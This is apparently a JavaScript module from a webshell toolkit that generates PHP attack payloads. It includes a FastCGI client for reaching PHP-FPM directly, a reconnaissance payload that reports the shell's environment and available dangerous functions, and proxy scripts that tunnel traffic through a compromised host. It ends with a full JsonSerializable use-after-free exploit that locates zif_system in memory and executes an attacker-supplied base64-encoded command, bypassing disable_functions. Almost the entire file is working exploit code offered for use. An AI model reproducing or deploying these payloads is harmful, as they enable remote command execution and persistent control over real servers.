module.exports = {
    FastCgiClient: () => {
        return `class TimedOutException extends \\Exception {}
  class ForbiddenException extends \\Exception {}
  class Client {
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;
    const REQ_STATE_WRITTEN    = 1;
    const REQ_STATE_OK         = 2;
    const REQ_STATE_ERR        = 3;
    const REQ_STATE_TIMED_OUT  = 4;
    private $_sock = null;
    private $_host = null;
    private $_port = null;
    private $_keepAlive = false;
    private $_requests = array();
    private $_persistentSocket = false;
    private $_connectTimeout = 5000;
    private $_readWriteTimeout = 5000;
    public function __construct($host, $port)
    {
      $this->_host = $host;
      $this->_port = $port;
    }
    public function setKeepAlive($b)
    {
      $this->_keepAlive = (boolean)$b;
      if (!$this->_keepAlive && $this->_sock) {
        fclose($this->_sock);
      }
    }
    public function getKeepAlive()
    {
      return $this->_keepAlive;
    }
    public function setPersistentSocket($b)
    {
      $was_persistent = ($this->_sock && $this->_persistentSocket);
      $this->_persistentSocket = (boolean)$b;
      if (!$this->_persistentSocket && $was_persistent) {
        fclose($this->_sock);
      }
    }
    public function getPersistentSocket()
    {
      return $this->_persistentSocket;
    }
    public function setConnectTimeout($timeoutMs)
    {
      $this->_connectTimeout = $timeoutMs;
    }
    public function getConnectTimeout()
    {
      return $this->_connectTimeout;
    }
    public function setReadWriteTimeout($timeoutMs)
    {
      $this->_readWriteTimeout = $timeoutMs;
      $this->set_ms_timeout($this->_readWriteTimeout);
    }
    public function getReadWriteTimeout()
    {
      return $this->_readWriteTimeout;
    }
    private function set_ms_timeout($timeoutMs) {
      if (!$this->_sock) {
        return false;
      }
      return stream_set_timeout($this->_sock, floor($timeoutMs / 1000), ($timeoutMs % 1000) * 1000);
    }
    private function connect()
    {
      if (!$this->_sock) {
        if ($this->_persistentSocket) {
          $this->_sock = pfsockopen($this->_host, $this->_port, $errno, $errstr, $this->_connectTimeout/1000);
        } else {
          $this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, $this->_connectTimeout/1000);
        }
        if (!$this->_sock) {
          throw new \\Exception('Unable to connect to FastCGI application: ' . $errstr);
        }
        if (!$this->set_ms_timeout($this->_readWriteTimeout)) {
          throw new \\Exception('Unable to set timeout on socket');
        }
      }
    }
    private function buildPacket($type, $content, $requestId = 1)
    {
      $clen = strlen($content);
      return chr(self::VERSION_1)         /* version */
          . chr($type)                    /* type */
          . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
          . chr($requestId & 0xFF)        /* requestIdB0 */
          . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
          . chr($clen & 0xFF)             /* contentLengthB0 */
          . chr(0)                        /* paddingLength */
          . chr(0)                        /* reserved */
          . $content;                     /* content */
    }
    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen < 128) {
          $nvpair = chr($nlen);
        } else {
            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
        }
        if ($vlen < 128) {
            $nvpair .= chr($vlen);
        } else {
            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
        }
        return $nvpair . $name . $value;
    }
    private function readNvpair($data, $length = null)
    {
        $array = array();
        if ($length === null) {
            $length = strlen($data);
        }
        $p = 0;
        while ($p != $length) {
            $nlen = ord($data{$p++});
            if ($nlen >= 128) {
                $nlen = ($nlen & 0x7F << 24);
                $nlen |= (ord($data{$p++}) << 16);
                $nlen |= (ord($data{$p++}) << 8);
                $nlen |= (ord($data{$p++}));
            }
            $vlen = ord($data{$p++});
            if ($vlen >= 128) {
                $vlen = ($nlen & 0x7F << 24);
                $vlen |= (ord($data{$p++}) << 16);
                $vlen |= (ord($data{$p++}) << 8);
                $vlen |= (ord($data{$p++}));
            }
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        }
        return $array;
    }
    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data{0});
        $ret['type']          = ord($data{1});
        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
        $ret['paddingLength'] = ord($data{6});
        $ret['reserved']      = ord($data{7});
        return $ret;
    }
    private function readPacket()
    {
        if ($packet = fread($this->_sock, self::HEADER_LEN)) {
            $resp = $this->decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len && ($buf=fread($this->_sock, $len)) !== false) {
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf = fread($this->_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }
    public function getValues(array $requestedInfo)
    {
        $this->connect();
        $request = '';
        foreach ($requestedInfo as $info) {
            $request .= $this->buildNvpair($info, '');
        }
        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
        $resp = $this->readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this->readNvpair($resp['content'], $resp['length']);
        } else {
            throw new \\Exception('Unexpected response type, expecting GET_VALUES_RESULT');
        }
    }
    public function request(array $params, $stdin)
    {
        $id = $this->async_request($params, $stdin);
        return $this->wait_for_response($id);
    }
    public function async_request(array $params, $stdin)
    {
        $this->connect();
        $id = mt_rand(1, (1 << 16) - 1);
        $keepAlive = intval($this->_keepAlive || $this->_persistentSocket);
        $request = $this->buildPacket(self::BEGIN_REQUEST
          ,chr(0) . chr(self::RESPONDER) . chr($keepAlive) . str_repeat(chr(0), 5)
          ,$id
        );
        $paramsRequest = '';
        foreach ($params as $key => $value) {
            $paramsRequest .= $this->buildNvpair($key, $value, $id);
        }
        if ($paramsRequest) {
            $request .= $this->buildPacket(self::PARAMS, $paramsRequest, $id);
        }
        $request .= $this->buildPacket(self::PARAMS, '', $id);
        if ($stdin) {
            $request .= $this->buildPacket(self::STDIN, $stdin, $id);
        }
        $request .= $this->buildPacket(self::STDIN, '', $id);
        if (fwrite($this->_sock, $request) === false || fflush($this->_sock) === false) {
            $info = stream_get_meta_data($this->_sock);
            if ($info['timed_out']) {
                throw new TimedOutException('Write timed out');
            }
            fclose($this->_sock);
            throw new \\Exception('Failed to write request to socket');
        }
        $this->_requests[$id] = array(
            'state' => self::REQ_STATE_WRITTEN,
            'response' => null
        );
        return $id;
    }
    public function wait_for_response($requestId, $timeoutMs = 0) {
        if (!isset($this->_requests[$requestId])) {
            throw new \\Exception('Invalid request id given');
        }
        if ($this->_requests[$requestId]['state'] == self::REQ_STATE_OK
            || $this->_requests[$requestId]['state'] == self::REQ_STATE_ERR
            ) {
            return $this->_requests[$requestId]['response'];
        }
        if ($timeoutMs > 0) {
            $this->set_ms_timeout($timeoutMs);
        } else {
            $timeoutMs = $this->_readWriteTimeout;
        }
        $startTime = microtime(true);
        do {
            $resp = $this->readPacket();
            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
                if ($resp['type'] == self::STDERR) {
                    $this->_requests[$resp['requestId']]['state'] = self::REQ_STATE_ERR;
                }
                $this->_requests[$resp['requestId']]['response'] .= $resp['content'];
            }
            if ($resp['type'] == self::END_REQUEST) {
                $this->_requests[$resp['requestId']]['state'] = self::REQ_STATE_OK;
                if ($resp['requestId'] == $requestId) {                      break;
                }
            }
            if (microtime(true) - $startTime >= ($timeoutMs * 1000)) {
                $this->set_ms_timeout($this->_readWriteTimeout);
                throw new \\Exception('Timed out');
            }
        } while ($resp);
        if (!is_array($resp)) {
            $info = stream_get_meta_data($this->_sock);
            $this->set_ms_timeout($this->_readWriteTimeout);
            if ($info['timed_out']) {
                throw new TimedOutException('Read timed out');
            }
            if ($info['unread_bytes'] == 0
                    && $info['blocked']
                    && $info['eof']) {
                throw new ForbiddenException('Not in white list. Check listen.allowed_clients.');
            }
            throw new \\Exception('Read failed');
        }
        $this->set_ms_timeout($this->_readWriteTimeout);
        switch (ord($resp['content']{4})) {
            case self::CANT_MPX_CONN:
                throw new \\Exception('This app can\\'t multiplex [CANT_MPX_CONN]');
                break;
            case self::OVERLOADED:
                throw new \\Exception('New request rejected; too busy [OVERLOADED]');
                break;
            case self::UNKNOWN_ROLE:
                throw new \\Exception('Role value not known [UNKNOWN_ROLE]');
                break;
            case self::REQUEST_COMPLETE:
                return $this->_requests[$requestId]['response'];
        }
    }
  };
    `.replace(/\n\s+?/g, '');
    },
    BaseInfo: () => {
        return `$rt = array(
            "os" => php_uname('s'),
            "arch" => (PHP_INT_SIZE==4?32:64),
            "ver" => substr(PHP_VERSION,0,3),
            "shell_name" => basename($_SERVER['SCRIPT_NAME']),
            "phpself" => realpath("."),
            "temp_dir" => sys_get_temp_dir(),
            "open_basedir" => array(),
            "funcs" => array(),
        );
        $opath_str = ini_get('open_basedir');
        if(strlen($opath_str)){
            $opath = explode(":", $opath_str);
            foreach($opath as $p) {
                $rp = realpath($p);
                $rt["open_basedir"][$rp] = (is_writable($rp)?1:0);
            }
        }
        $func_arr = array("dl", "putenv", "error_reporting", "error_log", "file_put_contents", "file_get_contents", "fopen", "fclose", "fwrite", "tempnam", "imap_open", "symlink", "curl_init", "fsockopen");
        foreach ($func_arr as $f) {
            $rt["funcs"][$f] = (function_exists($f)?1:0);
        }
        $rt["funcs"]["dl"] = ((bool)ini_get("enable_dl")?1:0);
        echo json_encode($rt);
        `.replace(/\n\s+?/g, '');
    },
    ProxyScript: (url) => {
        return `<?php
        set_time_limit(120);
        $aAccess = curl_init();
        curl_setopt($aAccess, CURLOPT_URL, "${url}?".$_SERVER['QUERY_STRING']);
        curl_setopt($aAccess, CURLOPT_HEADER, true);
        curl_setopt($aAccess, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($aAccess, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($aAccess, CURLOPT_SSL_VERIFYPEER, false);  
        curl_setopt($aAccess, CURLOPT_SSL_VERIFYHOST, false);  
        curl_setopt($aAccess, CURLOPT_TIMEOUT, 60);
        curl_setopt($aAccess, CURLOPT_BINARYTRANSFER, true);
        if(!empty($_SERVER['HTTP_REFERER'])){
            curl_setopt($aAccess,CURLOPT_REFERER,$_SERVER['HTTP_REFERER']);
        }
        $headers=get_client_header();
        curl_setopt($aAccess,CURLOPT_HTTPHEADER,$headers);
        if($_SERVER['REQUEST_METHOD']=='POST') {
            curl_setopt($aAccess, CURLOPT_POST, 1);
            curl_setopt($aAccess, CURLOPT_POSTFIELDS, file_get_contents('php://input'));
        }
        $sResponse = curl_exec($aAccess);
        list($headerstr,$sResponse)=parseHeader($sResponse);
        $headarr= explode("\\r\\n", $headerstr);
        foreach($headarr as $h){
            if(strlen($h)>0){
                if(strpos($h,'Content-Length')!==false) continue;
                if(strpos($h,'Transfer-Encoding')!==false) continue;
                if(strpos($h,'Connection')!==false) continue;
                if(strpos($h,'HTTP/1.1 100 Continue')!==false) continue;
                header($h);
            }
        }
        function replace_html_path($arrMatche){
            $sPath = makeUrl($arrMatche[4]);
            if(strtolower($arrMatche[1])=='img') {
                $sPath.= '&bin=1' ;
            }
            return "<{$arrMatche[1]} {$arrMatche[2]} {$arrMatche[3]}=\\"{$sPath}\\"" ;
        }
        function get_client_header(){
            $headers=array('Expect:');
            foreach($_SERVER as $k=>$v){
                if(strpos($k,'HTTP_')===0){
                    $k=strtolower(preg_replace('/^HTTP/', '', $k));
                    $k=preg_replace_callback('/_\\w/','header_callback',$k);
                    $k=preg_replace('/^_/','',$k);
                    $k=str_replace('_','-',$k);
                    if($k=='Host') continue;
                    $headers[]="$k:$v";
                }
            }
            return $headers;
        }
        function header_callback($str){
            return strtoupper($str[0]);
        }
        function parseHeader($sResponse){
            list($headerstr,$sResponse)=explode("\\r\\n\\r\\n",$sResponse, 2);
            $ret=array($headerstr,$sResponse);
            if(preg_match('/^HTTP\\/1\.1 \\d{3}/', $sResponse)){
                $ret=parseHeader($sResponse);
            }
            return $ret;
        }
        curl_close($aAccess);
        echo $sResponse;`;
    },
    ProxyScriptFsock: (host, port, url) => {
        return `<?php
function get_client_header(){
    $headers=array();
    foreach($_SERVER as $k=>$v){
        if(strpos($k,'HTTP_')===0){
            $k=strtolower(preg_replace('/^HTTP/', '', $k));
            $k=preg_replace_callback('/_\\w/','header_callback',$k);
            $k=preg_replace('/^_/','',$k);
            $k=str_replace('_','-',$k);
            if($k=='Host') continue;
            $headers[]="$k:$v";
        }
    }
    return $headers;
}
function header_callback($str){
    return strtoupper($str[0]);
}
function parseHeader($sResponse){
    list($headerstr,$sResponse)=explode("\r\n\r\n",$sResponse, 2);
    $ret=array($headerstr,$sResponse);
    if(preg_match('/^HTTP\/1\.1 \d{3}/', $sResponse)){
        $ret=parseHeader($sResponse);
    }
    return $ret;
}

set_time_limit(120);
$headers=get_client_header();
$host = "${host}";
$port = ${port};
$errno = '';
$errstr = '';
$timeout = 30;
$url = "${url}";

if (!empty($_SERVER['QUERY_STRING'])){
    $url .= "?".$_SERVER['QUERY_STRING'];
};

$fp = fsockopen($host, $port, $errno, $errstr, $timeout);
if(!$fp){
    return false;
}

$method = "GET";
$post_data = "";
if($_SERVER['REQUEST_METHOD']=='POST') {
    $method = "POST";
    $post_data = file_get_contents('php://input');
}

$out = $method." ".$url." HTTP/1.1\\r\\n";
$out .= "Host: ".$host.":".$port."\\r\\n";
if (!empty($_SERVER['CONTENT_TYPE'])) {
    $out .= "Content-Type: ".$_SERVER['CONTENT_TYPE']."\\r\\n";
}
$out .= "Content-length:".strlen($post_data)."\\r\\n";

$out .= implode("\\r\\n",$headers);
$out .= "\\r\\n\\r\\n";
$out .= "".$post_data;

fputs($fp, $out);

$response = '';
while($row=fread($fp, 4096)){
    $response .= $row;
}
fclose($fp);
$pos = strpos($response, "\\r\\n\\r\\n");
$response = substr($response, $pos+4);
echo $response;
`;
    },
    JSON_Serializer_UAF(bin, cmd) {
        return `$cmd = "${bin} -c \\\"".@base64_decode("${Buffer.from(cmd).toString('base64')}")."\\\"";
$n_alloc = 10;
class MySplFixedArray extends SplFixedArray {
    public static $leak;
}
class Z implements JsonSerializable {
    public function write(&$str, $p, $v, $n = 8) {
      $i = 0;
      for($i = 0; $i < $n; $i++) {
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8;
      }
    }
    public function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
    public function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }
    public function leak1($addr) {
        global $spl1;
        $this->write($this->abc, 8, $addr - 0x10);
        return strlen(get_class($spl1));
    }
    public function leak2($addr, $p = 0, $s = 8) {
        global $spl1, $fake_tbl_off;
        $this->write($this->abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted
        $this->write($this->abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval
        $this->write($this->abc, $fake_tbl_off + 0x20, 6); # type (string)
        $leak = strlen($spl1::$leak);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }
    public function parse_elf($base) {
        $e_type = $this->leak2($base, 0x10, 2);
        $e_phoff = $this->leak2($base, 0x20);
        $e_phentsize = $this->leak2($base, 0x36, 2);
        $e_phnum = $this->leak2($base, 0x38, 2);
        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = $this->leak2($header, 0, 4);
            $p_flags = $this->leak2($header, 4, 4);
            $p_vaddr = $this->leak2($header, 0x10);
            $p_memsz = $this->leak2($header, 0x28);
            if($p_type == 1 && $p_flags == 6) {
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }
        if(!$data_addr || !$text_size || !$data_size)
            return false;
        return [$data_addr, $text_size, $data_size];
    }
    public function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = $this->leak2($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $text_size) {
                $deref = $this->leak2($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;
            $leak = $this->leak2($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $text_size) {
                $deref = $this->leak2($leak);
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;
            return $data_addr + $i * 8;
        }
    }
    public function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = $this->leak2($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }
    public function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->leak2($addr);
            $f_name = $this->leak2($f_entry, 0, 6);
            if($f_name == 0x6d6574737973) {
                return $this->leak2($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
    public function jsonSerialize() {
        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;
        $contiguous = [];
        for($i = 0; $i < $n_alloc; $i++)
            $contiguous[] = new DateInterval('PT1S');
        $room = [];
        for($i = 0; $i < $n_alloc; $i++)
            $room[] = new Z();
        $_protector = $this->ptr2str(0, 78);
        $this->abc = $this->ptr2str(0, 79);
        $p = new DateInterval('PT1S');
        unset($y[0]);
        unset($p);
        $protector = ".$_protector";
        $x = new DateInterval('PT1S');
        $x->d = 0x2000;
        $x->h = 0xdeadbeef;
        if($this->str2ptr($this->abc) != 0xdeadbeef) {
            die('UAF failed.');
        }
        $spl1 = new MySplFixedArray();
        $spl2 = new MySplFixedArray();
        $class_entry = $this->str2ptr($this->abc, 0x120);
        $handlers = $this->str2ptr($this->abc, 0x128);
        $php_heap = $this->str2ptr($this->abc, 0x1a8);
        $abc_addr = $php_heap - 0x218;
        $fake_obj = $abc_addr;
        $this->write($this->abc, 0, 2);
        $this->write($this->abc, 0x120, $abc_addr);
        for($i = 0; $i < 16; $i++) {
            $this->write($this->abc, 0x10 + $i * 8, 
                $this->leak1($class_entry + 0x10 + $i * 8));
        }
        $fake_tbl_off = 0x70 * 4 - 16;
        $this->write($this->abc, 0x30, $abc_addr + $fake_tbl_off);
        $this->write($this->abc, 0x38, $abc_addr + $fake_tbl_off);
        $this->write($this->abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10);
        $this->write($this->abc, $fake_tbl_off + 8, 10);
        $binary_leak = $this->leak2($handlers + 0x10);
        if(!($base = $this->get_binary_base($binary_leak))) {
            die("Couldn't determine binary base address");
        }
        if(!($elf = $this->parse_elf($base))) {
            die("Couldn't parse ELF");
        }
        if(!($basic_funcs = $this->get_basic_funcs($base, $elf))) {
            die("Couldn't get basic_functions address");
        }
        if(!($zif_system = $this->get_system($basic_funcs))) {
            die("Couldn't get zif_system address");
        }
        $fake_bkt_off = 0x70 * 5 - 16;
        $function_data = $this->str2ptr($this->abc, 0x50);
        for($i = 0; $i < 4; $i++) {
            $this->write($this->abc, $fake_bkt_off + $i * 8, 
                $this->leak2($function_data + 0x40 * 4, $i * 8));
        }
        $fake_bkt_addr = $abc_addr + $fake_bkt_off;
        $this->write($this->abc, 0x50, $fake_bkt_addr);
        for($i = 0; $i < 3; $i++) {
            $this->write($this->abc, 0x58 + $i * 4, 1, 4);
        }
        $function_zval = $this->str2ptr($this->abc, $fake_bkt_off);
        for($i = 0; $i < 12; $i++) {
            $this->write($this->abc,  $fake_bkt_off + 0x70 + $i * 8, 
                $this->leak2($function_zval, $i * 8));
        }
        $this->write($this->abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);
        $this->write($this->abc, $fake_bkt_off, $fake_bkt_addr + 0x70);
        $spl1->offsetGet($cmd);
    }
}
$y = [new Z()];
json_encode([&$y]);
`;
    }
}